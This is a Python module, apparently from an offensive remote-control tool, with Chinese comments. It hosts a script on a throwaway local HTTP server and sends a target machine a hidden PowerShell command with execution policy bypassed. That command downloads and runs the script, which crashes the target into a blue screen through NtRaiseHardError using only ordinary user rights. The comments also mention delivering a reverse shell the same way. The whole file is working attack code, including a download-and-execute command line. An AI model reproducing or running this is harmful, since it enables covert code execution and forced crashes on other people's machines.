"""蓝屏载荷：把脚本挂在本机一次性 HTTP 服务上，由目标自己取回执行。

脚本有三百多个字符，超过命令通道单条 163 个 UTF-16 单元的上限。早先按 base64
分片写临时文件要连发六七条报文，目标侧常常只执行其中几条，落地的文件不全就
解不出脚本；改成脚本托管、目标自取的单个报文，与反弹终端下发脚本的做法一致。
"""

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import Event, Lock, Thread, Timer

from app.packets.codec import pkg_sendlist
from app.packets.constants import (
    BLUE_SCREEN_PATH,
    BLUE_SCREEN_SCRIPT,
    BLUE_SCREEN_SERVE_SECONDS,
    BLUE_SCREEN_WAIT_SECONDS,
    COMMAND_MAX_BYTES,
)
from app.system.net.local import detect_local_ip

# 单条远程命令的字符上限：报文容量的一半，UTF-16 每个字符占两个字节。
MAX_COMMAND_CHARS = COMMAND_MAX_BYTES // 2

# 当前正在托管的服务，下一次发声前一直复用，避免每发一条就换端口。
_active_server = None
_active_lock = Lock()


class BlueScreenServer:
    """临时托管的 HTTP 服务：只回同一份脚本，取走后等超时自关。"""

    def __init__(self, host, serve_seconds=BLUE_SCREEN_SERVE_SECONDS):
        """初始化服务。

        Args:
            host: 目标回连用的本机 IPv4 地址，监听端口由系统分配。
            serve_seconds: 服务保持打开的最长时间，秒。
        """
        self.host = host
        self.serve_seconds = serve_seconds
        self.served = Event()
        self._httpd = None
        self._thread = None
        self._closed = False

    @property
    def port(self):
        """返回实际监听端口，未启动时为 0。"""
        return self._httpd.server_address[1] if self._httpd else 0

    @property
    def url(self):
        """返回目标下载脚本用的地址。"""
        return "http://%s:%d%s" % (self.host, self.port, BLUE_SCREEN_PATH)

    @property
    def closed(self):
        """服务是否已经关闭。"""
        return self._closed

    def start(self):
        """启动监听，并在 ``serve_seconds`` 后自动关闭。

        Returns:
            BlueScreenServer: 自身，便于链式调用。
        """
        body = BLUE_SCREEN_SCRIPT.encode("utf-8")
        served = self.served

        class Handler(BaseHTTPRequestHandler):
            """任何路径都回同一份脚本，目标取走后记录一次。"""

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-Type", "text/plain; charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
                served.set()

            def log_message(self, *_args):
                """不往标准错误写访问日志。"""

        self._httpd = ThreadingHTTPServer(("0.0.0.0", 0), Handler)
        self._thread = Thread(
            target=self._httpd.serve_forever,
            kwargs={"poll_interval": 0.1},
            daemon=True,
        )
        self._thread.start()
        timer = Timer(self.serve_seconds, self.close)
        # 定时器必须是守护线程，否则界面退出会一直等它。
        timer.daemon = True
        timer.start()
        return self

    def wait(self, timeout=BLUE_SCREEN_WAIT_SECONDS):
        """等目标把脚本取走。

        Args:
            timeout: 最长等待秒数。

        Returns:
            bool: 目标已取回脚本时为 True，超时或提前关闭时为 False。
        """
        return self.served.wait(timeout)

    def close(self):
        """停止监听并等线程退出，可重复调用。"""
        if self._closed:
            return
        self._closed = True
        if self._httpd is not None:
            self._httpd.shutdown()
            self._httpd.server_close()
        if self._thread is not None:
            self._thread.join(1)


def _server_for(target=None):
    """返回可用的托管服务，上一个已关闭时换一个新的。

    Args:
        target: 目标地址，用来挑目标回连得到的本机网卡。

    Returns:
        BlueScreenServer: 已启动的服务。
    """
    global _active_server
    with _active_lock:
        if _active_server is not None and not _active_server.closed:
            return _active_server
        _active_server = BlueScreenServer(detect_local_ip(target)).start()
        return _active_server


def blue_screen_command(target=None):
    """返回下发给目标的那条命令：让目标取回脚本并立即执行。

    Args:
        target: 目标地址，用来挑目标能回连的本机地址；省略时按通用网卡探测。

    Returns:
        str: 一条可以直接走远程命令通道的命令。

    Raises:
        ValueError: 命令超出远程命令通道容量。
    """
    server = _server_for(target)
    command = (
        "powershell -w hidden -ExecutionPolicy Bypass -c "
        "\"IEX((New-Object Net.WebClient).DownloadString('%s'))\"" % server.url
    )
    if len(command) > MAX_COMMAND_CHARS:
        raise ValueError(
            "蓝屏命令超过远程命令通道容量（%d 个字符）" % MAX_COMMAND_CHARS
        )
    return command


def blue_screen_packets(target=None):
    """返回蓝屏所需的报文：一条取回脚本的命令。

    Args:
        target: 目标地址，用来挑目标能回连的本机地址；省略时按通用网卡探测。

    Returns:
        list[list[int]]: 待发送的命令报文。
    """
    return [pkg_sendlist("-c", blue_screen_command(target))]


def payload_hint():
    """返回载荷说明的中文提示，供 DEBUG 日志使用。

    目标只需普通用户令牌即可执行：关机特权在工作站默认授予 Users，脚本自行
    启用后调用内核接口，不建计划任务，也不需要管理员。

    Returns:
        str: 形如「脚本由本机临时 HTTP 托管…；报文 1 条」。
    """
    return (
        "脚本由本机临时 HTTP 托管，目标取回后启用关机特权并调用 "
        "NtRaiseHardError；报文 1 条"
    )


def wait_for_blue_screen(timeout=BLUE_SCREEN_WAIT_SECONDS):
    """等目标取回脚本，供发完就退出的命令行使用。

    Args:
        timeout: 最长等待秒数。

    Returns:
        bool: 目标已取回脚本时为 True。
    """
    with _active_lock:
        server = _active_server
    if server is None:
        return False
    return server.wait(timeout)
